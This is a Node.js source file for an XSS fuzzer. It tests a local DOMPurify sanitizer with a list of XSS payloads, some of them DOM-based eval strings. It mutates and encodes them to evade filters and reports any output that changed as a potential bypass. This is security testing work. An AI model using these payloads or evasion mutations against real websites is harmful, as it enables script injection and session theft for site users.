const { Buffer } = require('buffer');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const os = require('os');
const Iconv = require('iconv-lite');
const crypto = require('crypto');
const fs = require('fs');

// Configuration object
const config = {
  maxPayloads: 1000,
  encodings: ['ISO-2022-JP'],
  mlPayloadCount: 20,
  maxPayloadLength: 100,
  reportFile: 'xss_fuzzer_report.json',
  maxWorkersPayloads: 10, // Maximum payloads per worker
  batchSize: 100 // Number of results to accumulate before sending to main thread
};

class MarkovChain {
    constructor() {
        this.chain = new Map();
    }

    addSequence(sequence) {
        for (let i = 0; i < sequence.length - 1; i++) {
            const current = sequence[i];
            const next = sequence[i + 1];
            if (!this.chain.has(current)) {
                this.chain.set(current, new Map());
            }
            const nextMap = this.chain.get(current);
            nextMap.set(next, (nextMap.get(next) || 0) + 1);
        }
    }

    generate(length) {
        if (this.chain.size === 0) return '';
        let current = Array.from(this.chain.keys())[Math.floor(Math.random() * this.chain.size)];
        let result = current;
        for (let i = 1; i < length; i++) {
            if (!this.chain.has(current)) {
                break;
            }
            const nextMap = this.chain.get(current);
            const nextChars = Array.from(nextMap.keys());
            const nextWeights = Array.from(nextMap.values());
            const totalWeight = nextWeights.reduce((sum, weight) => sum + weight, 0);
            let random = Math.random() * totalWeight;
            let nextIndex = 0;
            while (random > 0) {
                random -= nextWeights[nextIndex];
                nextIndex++;
            }
            nextIndex--;
            const next = nextChars[nextIndex];
            result += next;
            current = next;
        }
        return result;
    }
}

class PayloadGenerator {
    constructor() {
        this.successfulPatterns = new Set();
        this.memoizedPayloads = new Map();
        this.browserSpecificPayloads = this.generateBrowserSpecificPayloads();
        this.markovChain = new MarkovChain();
        this.uniquePayloads = new Set();
    }

    generateBasePayloads() {
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<a href="javascript:alert(1)">Click me</a>',
            '<div onmouseover="alert(1)">Hover me</div>',
            '<input type="text" onfocus="alert(1)" autofocus>',
            '<details open ontoggle="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<video src=x onerror=alert(1)>',
            '<body onload=alert(1)>',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click',
            '<table background="javascript:alert(1)"></table>',
            '"><script>alert(1)</script>',
            '<!-- <img src=x onerror=alert(1)> -->',
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
        ];
    }

    generateBrowserSpecificPayloads() {
        return {
            chrome: [
                '<script>({[]})</script>',
                '<svg><script>alert&#40;1)</script>',
                '<svg><script>alert&#x28;1&#x29;</script>'
            ],
            firefox: [
                '<svg xmlns="#"><script>alert(1)</script></svg>',
                '<svg><style>{font-family:\'<script>alert(1)</script>\';}</style></svg>'
            ],
            safari: [
                '<svg><script>alert&lpar;1&rpar;</script>',
                '<svg><script>alert&#x28;1&#x29;</script>'
            ],
            edge: [
                '<x onclick=alert(1)>click this!',
                '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">Click me</text></a></svg>'
            ]
        };
    }

    generateDOMBasedPayloads() {
        return [
            '"><script>eval(location.hash.slice(1))</script>',
            '<img src=x onerror=eval(atob(this.id))>',
            '<svg><script>eval(location.search.slice(1))</script>',
            '<iframe src="javascript:eval(name)"></iframe>',
            '<script>eval(document.cookie)</script>'
        ];
    }

    generateMLPayloads(count = config.mlPayloadCount, maxLength = config.maxPayloadLength) {
        const payloads = [];
        for (let i = 0; i < count; i++) {
            let payload = this.markovChain.generate(maxLength);
            if (!payload.includes('<') || !payload.includes('>')) {
                payload = `<${payload}>`;
            }
            if (this.isUniquePayload(payload)) {
                payloads.push(payload);
            }
        }
        return payloads;
    }

    isUniquePayload(payload) {
        const hash = crypto.createHash('sha256').update(payload).digest('hex');
        if (this.uniquePayloads.has(hash)) {
            return false;
        }
        this.uniquePayloads.add(hash);
        return true;
    }

    *generateDynamicPayloads() {
        const basePayloads = this.generateBasePayloads();
        const domBasedPayloads = this.generateDOMBasedPayloads();
        const browserPayloads = Object.values(this.browserSpecificPayloads).flat();
        const mlPayloads = this.generateMLPayloads();

        const allPayloads = [...basePayloads, ...domBasedPayloads, ...browserPayloads, ...mlPayloads];

        for (const payload of allPayloads) {
            if (this.isUniquePayload(payload)) {
                yield payload;
            }
        }

        for (const pattern of this.successfulPatterns) {
            const variants = [
                pattern.replace('alert(1)', 'alert(2)'),
                pattern.replace('XSS', 'XSS2'),
                this.mutateSuccessfulPattern(pattern)
            ];
            for (const variant of variants) {
                if (this.isUniquePayload(variant)) {
                    yield variant;
                }
            }
        }
    }

    mutateSuccessfulPattern(pattern) {
        const mutations = [
            p => p.replace('alert', 'confirm'),
            p => p.replace('1', 'document.domain'),
            p => p.replace('>', ' id=x>'),
            p => p.replace('script', 'scrscriptipt'),
            p => p.replace('on', 'oonn'),
            p => p.split('').reverse().join('')
        ];
        return mutations[Math.floor(Math.random() * mutations.length)](pattern);
    }

    addSuccessfulPattern(payload) {
        this.successfulPatterns.add(payload);
        this.markovChain.addSequence(payload);
    }
}

const mutationFunctions = [
    p => p.toUpperCase(),
    p => p.toLowerCase(),
    p => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''),
    p => encodeURIComponent(p),
    p => p.replace(/</g, '&lt;'),
    p => p.replace(/>/g, '&gt;'),
    p => p.replace(/"/g, '&quot;'),
    p => p.replace(/'/g, '&#x27;'),
    p => p.replace(/&/g, '&amp;'),
    p => p.replace(/\//g, '&#x2F;'),
    p => p.includes('<script') ? p.replace('script', 'scr\\ipt') : p,
    p => p.includes('javascript:') ? p.replace('javascript:', 'java\\script:') : p,
    p => p.includes('=') ? p.replace('=', '&#x3D;') : p,
    p => p.includes('=') ? p.replace('=', '=\'') : p,
    p => p.includes('http') ? p.replace('http', 'ht\\tp') : p,
    p => p.includes('style') ? p.replace('style', 'st\\yle') : p,
    p => p.replace(/[aeiou]/g, char => `&#x${char.charCodeAt(0).toString(16)};`),
    p => p.replace(/\s/g, '/**/')
];

function contextAwareMutate(payload) {
    return mutationFunctions.map(mutate => mutate(payload));
}

const memoizedInsertions = new Map();

function insertEscapeSequence(payload, sequence) {
    const memoKey = `${payload}|${sequence}`;
    if (memoizedInsertions.has(memoKey)) {
        return memoizedInsertions.get(memoKey);
    }

    const insertionPoints = [
        { index: 0, variant: sequence + payload },
        { index: payload.length, variant: payload + sequence },
        { index: payload.indexOf('>'), variant: payload.replace('>', sequence + '>') },
        { index: payload.indexOf('"'), variant: payload.replace('"', sequence + '"') },
        { index: payload.indexOf('='), variant: payload.replace('=', sequence + '=') },
        { index: payload.indexOf('<'), variant: payload.replace('<', sequence + '<') },
        { index: payload.indexOf('javascript:'), variant: payload.replace('javascript:', 'javascript:' + sequence) }
    ];

    const result = insertionPoints
        .filter(point => point.index !== -1)
        .map(point => point.variant);

    memoizedInsertions.set(memoKey, result);
    return result;
}

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function testDOMPurify(payload, config = {}) {
  return DOMPurify.sanitize(payload, config);
}

function categorizeBypass(original, cleaned) {
  if (cleaned.includes('<script')) return 'Script Injection';
  if (cleaned.includes('javascript:')) return 'JavaScript Protocol';
  if (cleaned.includes('on') && /on\w+=/i.test(cleaned)) return 'Event Handler';
  if (cleaned.includes('<') && cleaned.includes('>')) return 'HTML Injection';
  if (cleaned.includes('data:')) return 'Data URI';
  if (cleaned.includes('eval(')) return 'DOM-based XSS';
  if (cleaned !== original) return 'Partial Bypass';
  return 'Unknown';
}

function* fuzzEncodings(payload, escapeSequence) {
  if (!/[<>'"&]/.test(payload)) {
    return;
  }

  for (const encoding of config.encodings) {
    try {
      const encodedPayload = Iconv.encode(Iconv.decode(Buffer.from(payload), 'utf8'), encoding).toString('binary');
      const cleanedPayload = testDOMPurify(encodedPayload);
      
      if (cleanedPayload !== encodedPayload) {
        const cleanedAllowedScripts = testDOMPurify(encodedPayload, {ALLOW_SCRIPT: true});
        yield {
          encoding,
          escapeSequence,
          original: payload,
          encoded: encodedPayload,
          cleanedDefault: cleanedPayload,
          cleanedAllowScript: cleanedAllowedScripts,
          category: categorizeBypass(encodedPayload, cleanedPayload)
        };
      }
    } catch (error) {
      console.error(`Error with encoding ${encoding}: ${error.message}`);
    }
  }
}

const escapeSequences = Array.from({length: 256}, (_, i) => `\\x${i.toString(16).padStart(2, '0')}`);

if (isMainThread) {
  console.log("Starting XSS fuzzer...");
  const payloadGenerator = new PayloadGenerator();
  const numCPUs = Math.min(os.cpus().length, Math.ceil(config.maxPayloads / config.maxWorkersPayloads));
  
  console.log(`Generating payloads... (max: ${config.maxPayloads})`);
  const payloadIterator = payloadGenerator.generateDynamicPayloads();
  const workerPayloads = Array(numCPUs).fill().map(() => []);
  
  let totalPayloads = 0;
  for (let i = 0; i < config.maxPayloads && totalPayloads < numCPUs * config.maxWorkersPayloads; i++) {
    const { value: payload, done } = payloadIterator.next();
    if (done) break;
    workerPayloads[i % numCPUs].push(payload);
    totalPayloads++;
  }
  
  console.log(`Generated ${totalPayloads} unique payloads.`);
  console.log(`Distributing payloads across ${numCPUs} worker threads...`);

  let results = [];
  let completedWorkers = 0;

  for (let i = 0; i < numCPUs; i++) {
    const worker = new Worker(__filename, {
      workerData: {
        payloads: workerPayloads[i],
        escapeSequences
      }
    });

    worker.on('message', (workerResults) => {
      results = results.concat(workerResults);
      console.log(`Received ${workerResults.length} results from worker ${i + 1}. Total results: ${results.length}`);
    });

    worker.on('error', (error) => {
      console.error(`Worker ${i + 1} error:`, error);
    });

    worker.on('exit', (code) => {
      completedWorkers++;
      console.log(`Worker ${i + 1} completed with exit code ${code}. (${completedWorkers}/${numCPUs})`);

      if (completedWorkers === numCPUs) {
        console.log("\nAll workers completed. Processing results...");
        processResults(results, payloadGenerator);
      }
    });
  }
} else {
  const { payloads, escapeSequences } = workerData;
  let workerResults = [];

  console.log(`Worker started, processing ${payloads.length} payloads...`);

  for (const [index, payload] of payloads.entries()) {
    console.log(`Processing payload ${index + 1}/${payloads.length}`);
    const mutatedPayloads = contextAwareMutate(payload);
    mutatedPayloads.push(payload);  // Include the original payload

    for (const mutatedPayload of mutatedPayloads) {
      for (const escapeSequence of escapeSequences) {
        const variantPayloads = insertEscapeSequence(mutatedPayload, escapeSequence);
        for (const variantPayload of variantPayloads) {
          for (const result of fuzzEncodings(variantPayload, escapeSequence)) {
            workerResults.push(result);
            if (workerResults.length >= config.batchSize) {
              parentPort.postMessage(workerResults);
              workerResults = [];
            }
          }
        }
      }
    }
  }

  if (workerResults.length > 0) {
    parentPort.postMessage(workerResults);
  }

  console.log(`Worker completed processing ${payloads.length} payloads.`);
}

function processResults(results, payloadGenerator) {
  console.log(`Processing ${results.length} total results...`);
  
  console.log("\nFuzzing complete. Summary of results:");
  console.log(`Total potential bypasses found: ${results.length}`);
  
  const byCategory = results.reduce((acc, result) => {
    acc[result.category] = (acc[result.category] || 0) + 1;
    return acc;
  }, {});

  console.log("\nBypasses by category:");
  Object.entries(byCategory).forEach(([category, count]) => {
    console.log(`${category}: ${count}`);
  });

  const topEncodings = results.reduce((acc, result) => {
    acc[result.encoding] = (acc[result.encoding] || 0) + 1;
    return acc;
  }, {});

  console.log("\nTop encodings with potential bypasses:");
  Object.entries(topEncodings)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .forEach(([encoding, count]) => {
      console.log(`${encoding}: ${count}`);
    });

  results.forEach(result => {
    payloadGenerator.addSuccessfulPattern(result.original);
  });

  // Write full report to file
  fs.writeFileSync(config.reportFile, JSON.stringify(results, null, 2));
  console.log(`\nFull report written to ${config.reportFile}`);
}